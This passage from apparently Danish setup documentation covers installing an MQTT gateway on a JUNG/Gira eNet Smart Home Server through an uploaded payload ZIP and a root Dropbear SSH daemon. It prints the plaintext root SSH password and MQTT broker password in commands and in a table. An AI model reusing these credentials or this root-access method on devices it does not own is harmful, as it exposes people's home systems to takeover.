#   "subscriptions": ["enet/#"],
#   ...
# }
```

### 9.3 Home Assistant opdager enhederne

Hvis du bruger Home Assistant med MQTT discovery, vil enheder automatisk dukke op:

```bash
# På din MQTT broker — lyt efter discovery topics
mosquitto_sub -h 10.0.0.6 -p 1883 -u homeassistant -P eih3Soh8Ioceon5ughawief2Chahn3aeShieW3queisee9zohch0ephaew0shaid -t "homeassistant/#" -v

# Forventet: Config topics for lys, kontakter, gardiner, knapper, scener...
```

### 9.4 Manuel MQTT test

```bash
# Taend et lys (erstat <uid> med enhedens UID — findes via dashboard)
mosquitto_pub -h 10.0.0.6 -p 1883 -u homeassistant -P eih3Soh8Ioceon5ughawief2Chahn3aeShieW3queisee9zohch0ephaew0shaid \
  -t "enet/light/<uid>/set" \
  -m '{"state":"ON"}'

# Laes status
mosquitto_sub -h 10.0.0.6 -p 1883 -u homeassistant -P eih3Soh8Ioceon5ughawief2Chahn3aeShieW3queisee9zohch0ephaew0shaid \
  -t "enet/#" -v
```

---

## 10. Deploy af MQTT-opdateringer efterfølgende

Når først SSH + MQTT-bundlen er installeret, kan du opdatere MQTT-gatewayen uden at bruge ZIP-payload igen:

### Hurtig deploy (hot-reload)

```bash
cd /hostrup/data/dev/enet
bash scripts/deploy.sh
```

Dette script:
1. Bygger JAR'en (`mvn clean package`)
2. Uploader via SSH `cat` pipe (Dropbear har ingen SFTP)
3. Kalder HTTP API'et: `POST http://10.0.0.9:8090/mqtt/api?action=reload`
4. OSGi hot-swapper bundlen uden at genstarte Felix

### Manuel deploy

```bash
# Build
cd /hostrup/data/dev/enet/felix && mvn clean package -q

# Upload
cat target/enet-mqtt-2.0-PRODUCTION.jar | \
  ssh root@10.0.0.9 "cat > /home/insta/felix-framework/bundle/startlevel4/enet-mqtt-2.0-PRODUCTION.jar"

# Hot-reload
curl -X POST "http://10.0.0.9:8090/mqtt/api?action=reload"
```

---

## Bilag A: Fejlsøgning

### A.1 ZIP-upload fejler

```bash
# Tjek om storage endpoint findes
curl -v -b "INSTASESSIONID=$SESSION" "http://10.0.0.9/storage/"

# Prov alternative endpoints
curl -v -X POST -H "Cookie: INSTASESSIONID=$SESSION" \
  -F "file=@payload_unified.zip" \
  "http://10.0.0.9/jsonrpc/upload"

# Tjek at cookien er gyldig
curl -s -b "INSTASESSIONID=$SESSION" \
  -H "Content-Type: application/json" \
  -d '{"method":"ping","params":[],"id":1}' \
  "http://10.0.0.9/jsonrpc"
```

### A.2 restartFelix trigger kører ikke

```bash
# Tjek at scriptet er executable
ssh root@10.0.0.9 'ls -la /home/insta/felix-framework/script/restartFelix'
ssh root@10.0.0.9 'chmod +x /home/insta/felix-framework/script/restartFelix'

# Kor scriptet manuelt via SSH
ssh root@10.0.0.9 '/home/insta/felix-framework/script/restartFelix'
```

### A.3 Dropbear starter ikke

```bash
# Tjek log
ssh root@10.0.0.9 'cat /tmp/dropbear.log'

# Generer keys manuelt
ssh root@10.0.0.9 'mkdir -p /etc/dropbear && dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key'

# Start dropbear manuelt i forgrunden (debug)
ssh root@10.0.0.9 'dropbear -F -E -p 2222'
# Fra en anden terminal: ssh root@10.0.0.9 -p 2222
```

### A.4 MQTT Gateway forbinder ikke

```bash
# Tjek Felix logs
ssh root@10.0.0.9 'tail -50 /home/insta/felix-framework/log/messages | grep -i -E "mqtt|hostrup|error|bundle"'

# Tjek at broker er tilgaengelig fra boksen
ssh root@10.0.0.9 'nc -zv 10.0.0.6 1883'

# Tjek mqtt-gateway.properties
ssh root@10.0.0.9 'cat /home/insta/felix-framework/conf/mqtt-gateway.properties'

# Tjek at JAR'en er i startlevel4
ssh root@10.0.0.9 'ls -la /home/insta/felix-framework/bundle/startlevel4/enet-mqtt*'
```

---

## Bilag B: Cross-compile Dropbear til ARMv7l

Hvis du har brug for en statisk kompileret Dropbear til eNet-boksen:

```bash
# På en build-maskine (x86_64 med cross-compiler):
git clone https://github.com/mkj/dropbear.git
cd dropbear

# Konfigurer til ARMv7l static
./configure \
  --host=arm-linux-gnueabihf \
  --enable-static \
  --disable-zlib \
  --disable-syslog \
  --disable-lastlog \
  --disable-utmp \
  --disable-utmpx \
  --disable-wtmp \
  --disable-wtmpx \
  --disable-loginfunc \
  --disable-pututline \
  --disable-pututxline

# Byg multi-call binary
make -j$(nproc) PROGRAMS="dropbear dropbearkey scp dbclient" MULTI=1 STATIC=1

# Verificer
file dropbearmulti
# dropbearmulti: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV),
# statically linked, ...

# Kopier til projektet
cp dropbearmulti /hostrup/data/dev/enet/
```

---

## Bilag C: Sikkerhedsnoter

### Passwords

| Service | Brugernavn | Password | Note |
|---------|------------|----------|------|
| eNet SSH | `root` | `pvxtwl` | Hardcoded i deploy scripts |
| MQTT Broker | `homeassistant` | `eih3Soh8Ioceon5ughawief2Chahn3aeShieW3queisee9zohch0ephaew0shaid` | I mqtt-gateway.properties |
| eNet Web UI | (admin) | (MD5 hash) | I /settings/users.properties |

### Forslag til haerdning efter installation

```bash
# Skift root password
ssh root@10.0.0.9
passwd

# Begraens Dropbear til kun at acceptere key-auth (efter du har tilfojet din public key)
ssh root@10.0.0.9 'mkdir -p ~/.ssh && echo "din-ssh-public-key" > ~/.ssh/authorized_keys'

# Deaktiver password login (kraever at du HAR tilfojet en public key forst!)
ssh root@10.0.0.9 'killall dropbear && dropbear -s -E -R -p 22'
# (-s flaget deaktiverer password login)
```

---

## Bilag D: Arkitektur-overblik (Post-installation)

```
+-------------------------------------------------------------------+
|                     eNet Smart Home Server                         |
|                     (10.0.0.9, ARMv7l)                             |
|                                                                    |
|  +--------------------------------------------------------------+ |
|  |  Dropbear SSH (port 22)  <- Permanent, auto-start ved boot   | |
|  +--------------------------------------------------------------+ |
|                                                                    |
|  +--------------------------------------------------------------+ |
|  |  Apache Felix OSGi Container (Java 8)                        | |
|  |                                                               | |
|  |  Start Level 4:                                               | |
|  |  +----------------------------------------------------------+ | |
|  |  |  enet-mqtt-2.0-PRODUCTION.jar                            | | |
|  |  |  +- MqttActivator  (OSGi BundleActivator)                | | |
|  |  |  +- MqttManager    (Eclipse Paho MQTT client)            | | |
|  |  |  +- ConfigManager  (Properties I/O)                      | | |
|  |  |  +- TopologyBuilder (HA MQTT Discovery)                  | | |
|  |  |  +- WebDashboard   (HTTP :8090 config/monitor)           | | |
|  |  +----------------------------------------------------------+ | |
|  |  +----------------------------------------------------------+ | |
|  |  |  com.insta.instanet.instanetbox.mdns (mDNS)              | | |
|  |  +----------------------------------------------------------+ | |
|  +--------------------------------------------------------------+ |
|                              |                                     |
|                              v                                     |
|  +--------------------------------------------------------------+ |
|  |  CTreiberCross (Native C driver)                              | |
|  |  Listens on 127.0.0.1:5000 (TCP)                              | |
|  +--------------------------------------------------------------+ |
|                              |                                     |
|                              v                                     |
|  +--------------------------------------------------------------+ |
|  |  CC1101 868 MHz KNX-RF Radio                                  | |
|  |  /dev/ttyAPP1 (UART)                                          | |
|  +--------------------------------------------------------------+ |
|                                                                    |
|  ===============================================================  |
|                       Ethernet (eth0)                             |
|  ===============================================================  |
|                              |                                     |
+------------------------------|-------------------------------------+
                               |
                               v
              +---------------------------------+
              |     MQTT Broker (10.0.0.6)       |
              |     Eclipse Mosquitto             |
              |     Port 1883                     |
              +---------------------------------+
                               |
                               v
              +---------------------------------+
              |     Home Assistant                |
              |     MQTT Discovery -> Auto-config  |
              +---------------------------------+
```

---

*Dokumentation genereret for eNet MQTT Gateway projektet.*
*Målsystem: JUNG/Gira eNet Smart Home Server v2.3.2*